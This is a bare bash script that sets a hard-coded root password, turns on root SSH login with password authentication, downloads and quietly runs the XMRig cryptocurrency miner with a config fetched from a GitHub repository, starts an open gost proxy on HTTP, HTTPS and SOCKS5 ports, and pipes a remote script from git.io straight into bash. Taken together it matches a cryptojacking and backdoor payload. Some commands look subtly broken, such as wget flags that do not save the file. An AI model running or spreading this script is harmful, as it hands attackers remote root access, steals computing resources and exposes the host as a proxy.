#!/bin/bash
echo root:NP1215GP55*3*com | sudo chpasswd root
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sudo service sshd restart
sudo wget -o- https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz
tar -xf /root/xmrig.tar.gz -C /root
chmod u+x ./xmrig
sudo wget -o- https://github.com/lamboeio/modin/raw/refs/heads/main/x.json
chmod u+x ./x.json
 ./xmrig --config=./x.json >/dev/null 2>&1
apt install -y wget screen
wget -qO- https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost-linux-amd64-2.11.5.gz |gzip -d >./gost && chmod 777 ./gost && screen -Sdm gost ./gost -L=http://:19991 -L=https://:19992 -L=socks5://:19993
bash <(curl -fsSL git.io/warp.sh) d
ping aws.amazon.com
